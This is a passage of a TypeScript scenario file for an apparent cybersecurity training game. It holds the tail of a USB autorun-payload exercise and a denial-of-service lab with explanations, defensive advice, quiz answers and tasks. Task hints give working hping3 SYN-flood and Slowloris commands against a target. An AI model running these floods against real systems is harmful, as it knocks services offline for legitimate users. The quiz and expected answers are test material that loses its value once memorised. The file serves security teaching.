            { id: 4, type: "checklist", title: "SIMULATE USB INSERTION", description: "Mount the USB image in the lab virtual environment and verify the autorun triggers your payload correctly", hint: "Mount USB image in lab VM", locked: false },
            { id: 5, type: "question", title: "WHY ARE USB ATTACKS EFFECTIVE?", description: "Think about human behaviour statistics", question: "What percentage of people plug in USB drives they find in public places?", expectedAnswer: "45", hint: "Studies show a surprisingly high number of people plug in found USB drives", locked: false }
        ]
    },
    {
        id: "dos-01",
        name: "NetFlood",
        category: "Denial of Service",
        difficulty: "ADVANCED",
        estimatedTime: "40 MIN",
        tools: ["hping3", "slowloris", "LOIC", "Wireshark"],
        icon: "🌊",
        locked: false,
        description: "Overwhelm target systems to cause disruption",
        objective: {
            whatIsIt: "Denial of Service attacks overwhelm a target system with traffic or requests until it can no longer serve legitimate users. Distributed DoS uses thousands of compromised machines to amplify the attack massively.",
            howItWorks: [
                { step: 1, title: "Choose Vector", description: "Select attack type volumetric flood protocol attack or application layer" },
                { step: 2, title: "Launch Flood", description: "Send massive volume of requests overwhelming target resources" },
                { step: 3, title: "Observe Impact", description: "Target becomes slow or completely unresponsive to legitimate users" }
            ],
            missions: [
                "Understand different DoS attack vectors",
                "Launch a controlled flood attack in lab environment",
                "Analyse the attack traffic in Wireshark"
            ],
            mentorAI: {
                intro: "Denial of Service attacks overwhelm systems with traffic until they crash and become unavailable. They do not steal data — their goal is purely disruption. Modern DDoS attacks can generate terabits per second of traffic.",
                whyItWorks: "Servers have finite resources — CPU memory and bandwidth. Flooding a server with more requests than it can handle exhausts these resources making it unable to serve legitimate users. Slowloris keeps connections open using minimal bandwidth to exhaust connection limits.",
                realWorldExample: "In 2016 the Mirai botnet launched a DDoS attack generating 1.2 terabits per second that took down major sites including Twitter Netflix and Reddit for hours across the entire US East Coast.",
                duringTips: [
                    "The SYN flood is sending thousands of connection requests per second exhausting the server connection table",
                    "Slowloris keeps hundreds of connections open using just a few kilobits per second",
                    "The server is now returning connection refused for all legitimate user requests",
                    "A CDN and DDoS protection service would absorb and filter this traffic before it reaches the server"
                ],
                postLesson: "DDoS protection requires infrastructure level solutions like Cloudflare or AWS Shield. As an individual if your site is under attack enabling DDoS protection through your hosting provider is the fastest mitigation. Rate limiting and connection limits reduce impact significantly."
            },
            guardianAI: {
                redFlags: [
                    "Website returning 503 Service Unavailable errors",
                    "Server CPU and memory at 100 percent usage",
                    "Massive spike in inbound traffic in network monitor",
                    "Legitimate users reporting site is unreachable",
                    "Server logs showing millions of requests per minute"
                ],
                immediateActions: [
                    "Enable DDoS protection through your hosting provider",
                    "Block attacking IP ranges at network firewall level",
                    "Enable rate limiting on all exposed endpoints",
                    "Contact your ISP for upstream traffic filtering",
                    "Scale up server capacity if using cloud hosting"
                ],
                futurePrevention: [
                    "Use a CDN with built-in DDoS protection like Cloudflare",
                    "Implement rate limiting on all public APIs and pages",
                    "Set up auto-scaling to handle traffic spikes",
                    "Create an incident response plan for DDoS events",
                    "Maintain relationships with ISP for traffic filtering"
                ]
            }
        },
        quiz: [
            { id: 1, question: "Difference between DoS and DDoS?", options: ["DDoS is faster", "DDoS uses multiple sources", "DoS is more dangerous", "They are the same"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What is a SYN flood attack?", options: ["Flooding with UDP packets", "Sending incomplete TCP handshakes", "Overloading DNS servers", "Sending large HTTP requests"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What is Slowloris?", options: ["A fast packet flooder", "App layer DoS keeping connections open", "A DDoS botnet tool", "A network scanner"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What is a botnet in DDoS context?", options: ["A security monitoring tool", "Network of compromised machines for attacks", "A load balancer", "A CDN service"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What mitigation stops volumetric DDoS?", options: ["Stronger passwords", "CDN and traffic scrubbing services", "Firewall rules only", "Antivirus software"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "CAPTURE BASELINE TRAFFIC", description: "Start a Wireshark capture on your network interface and browse the target site normally for 30 seconds to establish a baseline traffic measurement", hint: "Start Wireshark on eth0 browse normally 30s", locked: false },
            { id: 2, type: "question", title: "WHAT IS NORMAL TRAFFIC RATE?", description: "Check your Wireshark statistics", question: "Approximately how many packets per second did you see in normal traffic?", expectedAnswer: "10", hint: "Normal web browsing generates very few packets compared to a flood attack", locked: false },
            { id: 3, type: "checklist", title: "LAUNCH SYN FLOOD", description: "Execute a controlled SYN flood attack against the lab target using hping3 for exactly 30 seconds only", hint: "hping3 -S --flood -p 80 target-ip", locked: false },
            { id: 4, type: "checklist", title: "LAUNCH SLOWLORIS ATTACK", description: "Execute a Slowloris application layer attack against the web server and observe how it differs from the SYN flood", hint: "slowloris target-ip --port 80 --socket 200", locked: false },
            { id: 5, type: "question", title: "WHAT IS THE DIFFERENCE?", description: "Compare the two DoS techniques", question: "What makes Slowloris different from a SYN flood attack?", expectedAnswer: "keeps connections open", hint: "Slowloris uses very little bandwidth but exhausts server connection limits", locked: false }
        ]
    }
];

export function getScenario(id: string) {
    return scenarios.find(s => s.id === id);
}

export function getScenariosByDifficulty(difficulty: string) {
    return scenarios.filter(s => s.difficulty === difficulty);
}

export function getUnlockedScenarios() {
    return scenarios;
}
